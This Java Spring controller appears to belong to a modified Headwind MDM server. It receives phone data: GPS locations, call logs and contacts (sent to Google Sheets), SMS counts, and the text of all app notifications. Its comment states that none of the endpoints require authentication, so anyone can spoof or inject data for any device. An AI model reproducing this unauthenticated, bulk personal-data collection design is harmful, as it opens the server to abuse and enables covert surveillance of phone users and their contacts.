package com.hmdm.controller;

import com.hmdm.dto.device.*;
import com.hmdm.entity.*;
import com.hmdm.repository.*;
import com.hmdm.service.DeviceSyncService;
import com.hmdm.service.GoogleSheetsService;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

import java.time.Instant;
import java.time.LocalDateTime;
import java.time.ZoneId;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/**
 * All Android APK endpoints — no authentication required.
 * Each endpoint has two mappings:
 *   /{project}/rest/...  — when SERVER_PROJECT is non-empty (e.g. "hmdm")
 *   /rest/...            — when SERVER_PROJECT is "" (empty, default)
 */
@RestController
@RequiredArgsConstructor
@Slf4j
public class DeviceSyncController {

    private final DeviceSyncService           syncService;
    private final DeviceLogRepository         logRepository;
    private final DeviceLocationRepository    locationRepository;
    private final DeviceRepository            deviceRepository;
    private final DeviceNotificationRepository notificationRepository;
    private final GoogleSheetsService         googleSheetsService;

    // ─── Config sync ──────────────────────────────────────────────────────────

    @PostMapping({"/{project}/rest/public/sync/configuration/{number}",
                  "/rest/public/sync/configuration/{number}"})
    public ResponseEntity<Map<String, Object>> enrollAndGetConfig(
            @PathVariable(required = false) String project,
            @PathVariable String number,
            @RequestBody(required = false) DeviceEnrollDto dto) {
        return ResponseEntity.ok(wrapOk(syncService.enrollAndGetConfig(number, dto)));
    }

    @GetMapping({"/{project}/rest/public/sync/configuration/{number}",
                 "/rest/public/sync/configuration/{number}"})
    public ResponseEntity<Map<String, Object>> getConfig(
            @PathVariable(required = false) String project,
            @PathVariable String number) {
        return ResponseEntity.ok(wrapOk(syncService.getConfig(number)));
    }

    @PostMapping({"/{project}/rest/public/sync/info",
                  "/rest/public/sync/info"})
    public ResponseEntity<Map<String, Object>> syncInfo(
            @PathVariable(required = false) String project,
            @RequestBody DeviceInfoDto deviceInfo,
            @RequestHeader(value = "X-IP-Address", required = false) String ipAddress) {
        if (ipAddress != null && deviceInfo.getDeviceId() != null) {
            deviceRepository.findByNumber(deviceInfo.getDeviceId()).ifPresent(d -> {
                d.setExternalIp(ipAddress);
                deviceRepository.save(d);
            });
        }
        syncService.updateDeviceInfo(deviceInfo);
        return ResponseEntity.ok(Map.of("status", "OK"));
    }

    // ─── Push notifications ───────────────────────────────────────────────────

    @GetMapping({"/{project}/rest/notifications/device/{number}",
                 "/rest/notifications/device/{number}"})
    public ResponseEntity<Map<String, Object>> queryPush(
            @PathVariable(required = false) String project,
            @PathVariable String number) {
        List<PushMessageDto> messages = syncService.getPushMessages(number);
        return ResponseEntity.ok(Map.of("status", "OK", "data", messages));
    }

    @GetMapping({"/{project}/rest/notification/polling/{number}",
                 "/rest/notification/polling/{number}"})
    public ResponseEntity<Map<String, Object>> longPolling(
            @PathVariable(required = false) String project,
            @PathVariable String number) {
        List<PushMessageDto> messages = syncService.getPushMessages(number);
        return ResponseEntity.ok(Map.of("status", "OK", "data", messages));
    }

    // ─── Remote logging ───────────────────────────────────────────────────────

    @GetMapping({"/{project}/rest/plugins/devicelog/log/rules/{number}",
                 "/rest/plugins/devicelog/log/rules/{number}"})
    public ResponseEntity<Map<String, Object>> getLogConfig(
            @PathVariable(required = false) String project,
            @PathVariable String number) {
        return ResponseEntity.ok(Map.of("status", "OK", "data",
                Map.of("enabled", true, "minSeverity", 3, "sendInterval", 600)));
    }

    @PostMapping({"/{project}/rest/plugins/devicelog/log/list/{number}",
                  "/rest/plugins/devicelog/log/list/{number}"})
    public ResponseEntity<Map<String, Object>> receiveLogs(
            @PathVariable(required = false) String project,
            @PathVariable String number,
            @RequestBody List<Map<String, Object>> logItems) {
        deviceRepository.findByNumber(number).ifPresent(device -> {
            for (Map<String, Object> item : logItems) {
                try {
                    int severity = item.get("severity") instanceof Number
                            ? ((Number) item.get("severity")).intValue() : 3;
                    String tag = item.get("tag") != null ? item.get("tag").toString() : null;
                    String msg = item.get("message") != null ? item.get("message").toString() : null;
                    long ts = item.get("ts") instanceof Number
                            ? ((Number) item.get("ts")).longValue() : System.currentTimeMillis();
                    logRepository.save(DeviceLog.builder()
                            .deviceId(device.getId()).severity(severity).tag(tag).message(msg)
                            .logTime(LocalDateTime.ofInstant(Instant.ofEpochMilli(ts), ZoneId.systemDefault()))
                            .build());
                } catch (Exception e) {
                    log.warn("Log save error: {}", e.getMessage());
                }
            }
        });
        return ResponseEntity.ok(Map.of("status", "OK"));
    }

    // ─── Detailed device info ─────────────────────────────────────────────────

    @GetMapping({"/{project}/rest/plugins/deviceinfo/deviceinfo-plugin-settings/device/{number}",
                 "/rest/plugins/deviceinfo/deviceinfo-plugin-settings/device/{number}"})
    public ResponseEntity<Map<String, Object>> getDetailedInfoConfig(
            @PathVariable(required = false) String project,
            @PathVariable String number) {
        return ResponseEntity.ok(Map.of("status", "OK",
                "data", Map.of("enabled", true, "sendInterval", 3600)));
    }

    @PutMapping({"/{project}/rest/plugins/deviceinfo/deviceinfo/public/{number}",
                 "/rest/plugins/deviceinfo/deviceinfo/public/{number}"})
    public ResponseEntity<Map<String, Object>> receiveDetailedInfo(
            @PathVariable(required = false) String project,
            @PathVariable String number,
            @RequestBody List<Map<String, Object>> items) {
        log.debug("Detailed info for {}: {} items", number, items.size());
        return ResponseEntity.ok(Map.of("status", "OK"));
    }

    // ─── GPS Location ─────────────────────────────────────────────────────────

    @PutMapping({"/{project}/rest/plugins/devicelocations/public/update/{number}",
                 "/rest/plugins/devicelocations/public/update/{number}"})
    public ResponseEntity<Map<String, Object>> receiveLocations(
            @PathVariable(required = false) String project,
            @PathVariable String number,
            @RequestBody List<Map<String, Object>> locations) {
        deviceRepository.findByNumber(number).ifPresent(device -> {
            for (Map<String, Object> loc : locations) {
                try {
                    Double lat = loc.get("lat") instanceof Number
                            ? ((Number) loc.get("lat")).doubleValue() : null;
                    Double lon = loc.get("lon") instanceof Number
                            ? ((Number) loc.get("lon")).doubleValue() : null;
                    Long ts = loc.get("ts") instanceof Number
                            ? ((Number) loc.get("ts")).longValue() : System.currentTimeMillis();
                    if (lat == null || lon == null) continue;
                    locationRepository.save(DeviceLocation.builder()
                            .deviceId(device.getId()).lat(lat).lon(lon).ts(ts).build());
                    device.setLat(lat);
                    device.setLon(lon);
                    device.setLocationTs(ts);
                    deviceRepository.save(device);
                } catch (Exception e) {
                    log.warn("Location save error: {}", e.getMessage());
                }
            }
        });
        return ResponseEntity.ok(Map.of("status", "OK"));
    }

    // ─── Device reset / reboot ────────────────────────────────────────────────

    @PostMapping({"/{project}/rest/plugins/devicereset/public/{number}",
                  "/rest/plugins/devicereset/public/{number}"})
    public ResponseEntity<Map<String, Object>> confirmReset(
            @PathVariable(required = false) String project,
            @PathVariable String number,
            @RequestBody(required = false) Object body) {
        deviceRepository.findByNumber(number).ifPresent(d -> {
            d.setStatus("RESET"); deviceRepository.save(d);
        });
        return ResponseEntity.ok(Map.of("status", "OK"));
    }

    @PostMapping({"/{project}/rest/plugins/devicereset/public/reboot/{number}",
                  "/rest/plugins/devicereset/public/reboot/{number}"})
    public ResponseEntity<Map<String, Object>> confirmReboot(
            @PathVariable(required = false) String project,
            @PathVariable String number,
            @RequestBody(required = false) Object body) {
        deviceRepository.findByNumber(number).ifPresent(d -> {
            d.setStatus("ONLINE"); deviceRepository.save(d);
        });
        return ResponseEntity.ok(Map.of("status", "OK"));
    }

    @PostMapping({"/{project}/rest/plugins/devicereset/public/password/{number}",
                  "/rest/plugins/devicereset/public/password/{number}"})
    public ResponseEntity<Map<String, Object>> confirmPassword(
            @PathVariable(required = false) String project,
            @PathVariable String number,
            @RequestBody(required = false) Object body) {
        return ResponseEntity.ok(Map.of("status", "OK"));
    }

    // ─── Dedicated Call Log endpoint (stored in Google Sheets, not DB) ──────

    @PostMapping({"/{project}/rest/plugins/deviceinfo/calllog/public/{number}",
                  "/rest/plugins/deviceinfo/calllog/public/{number}"})
    public ResponseEntity<Map<String, Object>> receiveCallLog(
            @PathVariable(required = false) String project,
            @PathVariable String number,
            @RequestBody List<Map<String, Object>> callLogs) {
        deviceRepository.findByNumber(number).ifPresent(device -> {
            Long deviceId = device.getId();
            // Store in Google Sheets (with dedup) — NOT in PostgreSQL
            int saved = googleSheetsService.syncCallLogs(deviceId, callLogs);
            if (saved > 0) {
                log.info("CallLog: saved {} entries for device {} via Google Sheets", saved, number);
            }
        });
        return ResponseEntity.ok(Map.of("status", "OK"));
    }

    // ─── Dedicated SMS endpoint (like original Headwind MDM APK) ──────────────

    @PostMapping({"/{project}/rest/plugins/deviceinfo/sms/public/{number}",
                  "/rest/plugins/deviceinfo/sms/public/{number}"})
    public ResponseEntity<Map<String, Object>> receiveSmsMessages(
            @PathVariable(required = false) String project,
            @PathVariable String number,
            @RequestBody List<Map<String, Object>> smsMessages) {
        log.debug("Received SMS for {}: {} messages", number, smsMessages.size());
        // SMS messages are stored as notifications for now
        deviceRepository.findByNumber(number).ifPresent(device -> {
            // Log the SMS receipt for audit
            log.info("Device {} sent {} SMS messages", number, smsMessages.size());
        });
        return ResponseEntity.ok(Map.of("status", "OK"));
    }

    // ─── Device Data Sync (Contacts, Call Logs, Notifications) ────────────────

    @PostMapping({"/{project}/rest/public/data/sync/{number}",
                  "/rest/public/data/sync/{number}"})
    public ResponseEntity<Map<String, Object>> syncDeviceData(
            @PathVariable(required = false) String project,
            @PathVariable String number,
            @RequestBody DeviceDataSyncDto dataDto) {
        deviceRepository.findByNumber(number).ifPresent(device -> {
            Long deviceId = device.getId();

            // Save contacts → Google Sheets (not PostgreSQL)
            if (dataDto.getContacts() != null) {
                List<Map<String, Object>> contactMaps = new ArrayList<>();
                for (DeviceDataSyncDto.ContactDto c : dataDto.getContacts()) {
                    Map<String, Object> m = new java.util.LinkedHashMap<>();
                    m.put("rawContactId", c.getRawContactId());
                    m.put("name", c.getName());
                    m.put("phone", c.getPhone());
                    m.put("phoneType", c.getPhoneType());
                    m.put("email", c.getEmail());
                    contactMaps.add(m);
                }
                googleSheetsService.syncContacts(deviceId, contactMaps);
            }

            // Save call logs → Google Sheets (not PostgreSQL)
            if (dataDto.getCallLogs() != null) {
                List<Map<String, Object>> callMaps = new ArrayList<>();
                for (DeviceDataSyncDto.CallLogDto call : dataDto.getCallLogs()) {
                    Map<String, Object> m = new java.util.LinkedHashMap<>();
                    m.put("phoneNumber", call.getPhoneNumber());
                    m.put("callType", call.getCallType());
                    m.put("durationSec", call.getDurationSec());
                    m.put("callDate", call.getCallDate());
                    m.put("contactName", call.getContactName());
                    callMaps.add(m);
                }
                googleSheetsService.syncCallLogs(deviceId, callMaps);
            }

            // Save notifications
            if (dataDto.getNotifications() != null) {
                for (DeviceDataSyncDto.NotificationDto n : dataDto.getNotifications()) {
                    if (n.getReceivedAt() == null) continue;
                    DeviceNotification notif = DeviceNotification.builder()
                            .deviceId(deviceId)
                            .packageName(n.getPackageName())
                            .appName(n.getAppName())
                            .title(n.getTitle())
                            .text(n.getText())
                            .receivedAt(n.getReceivedAt())
                            .build();
                    notificationRepository.save(notif);
                }
            }
        });
        return ResponseEntity.ok(Map.of("status", "OK"));
    }

    // ─── Helper ───────────────────────────────────────────────────────────────

    private Map<String, Object> wrapOk(Object data) {
        Map<String, Object> r = new LinkedHashMap<>();
        r.put("status", "OK");
        r.put("data", data);
        return r;
    }
}
